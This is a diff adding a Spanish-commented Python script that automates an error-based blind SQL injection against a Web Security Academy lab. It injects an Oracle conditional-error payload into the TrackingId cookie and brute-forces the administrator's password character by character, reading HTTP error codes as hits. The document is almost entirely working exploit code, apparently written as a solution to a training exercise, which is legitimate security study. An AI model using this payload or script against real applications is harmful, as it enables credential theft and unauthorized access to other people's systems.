@@ -1,0 +1,72 @@
+#!/usr/bin/python3
+
+from pwn import * # lo utilizaremos para barras de progreso
+
+import requests #realizar peticiones
+
+import signal #capturar teclado
+
+import time # usar tiempo
+
+import pdb # debugging
+
+import sys # interctuar co el sistema
+
+import string # para jugar con caracteres
+
+
+def saliendo(sig, frame):
+        print('\n\n[+] Saliendo...\n\n')
+        sys.exit(1)
+
+
+# Capturar control C
+signal.signal(signal.SIGINT, saliendo) # cuando hagamos ctrl_c mandamos el flujo del progama a la funcion saliendo
+
+#definicio de variables
+
+urlinyectada='https://0a8c00cd03ceee9b8034039f00440045.web-security-academy.net' # url a la que inyectaremos , debemos cambiarla
+caracteres=string.printable # añadimos todos los caracteres printeables     Si algun caracter da problemas eliminadlo y volver a intentar. 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~
+
+
+
+
+def peticion():
+
+        contraseña='' # lo definimos vacio para en el bucle for ir aumentandolo
+
+        progreso1 = log.progress('Fuerza bruta') # creamos una barra de progreso 1
+        progreso1.status('Iniciando fuerza bruta') #le actualizamos el estado
+
+        time.sleep(1) # damos tiempo para leer lo bien que lo hacemos
+
+        progreso2 = log.progress('Password') # creamos la sgunda barra de progreso para qu nos actualice la pass
+        progreso2.status('Analizando pasword')
+
+        for posicion in range(1,21): # definiremos aqui la longitud del campo a testear , podeis probar a introducir  and length>=20  para ver si la longitud de la pass es igual o mayor a 20
+                for caracter in caracteres:
+                        
+                        cookie= {  # definimos las cookies
+                                "TrackingId":"W9xme6B6rG2UoHq9'||(select case when substr(password,%d,1)='%s' then to_char(1/0) else '' end from users where username='administrator')-- -" % (posicion,caracter),
+                                "session":"tM01kfdi4XADzGvBFcbs4uFvhjW22SaN"
+                                }
+                        progreso1.status(cookie['TrackingId']) # queremos que se actualice cpara que vamos lo que mandamos en cada bucle for
+
+
+                        r = requests.get(urlinyectada, cookies=cookie) # realizamos la peticion a laurl con las cookies
+
+                        if r.status_code >= 300: # verificacion de que acertamos con el caracter ya que tiene que dar un internal error 500
+
+                                contraseña += caracter # le sumamo a contraseña el caracter en el que esté
+                                progreso2.status(contraseña)
+                                break # para que no continue probando el resto de caracteres 
+
+
+
+def main():
+
+        peticion()
+
+
+main()
+
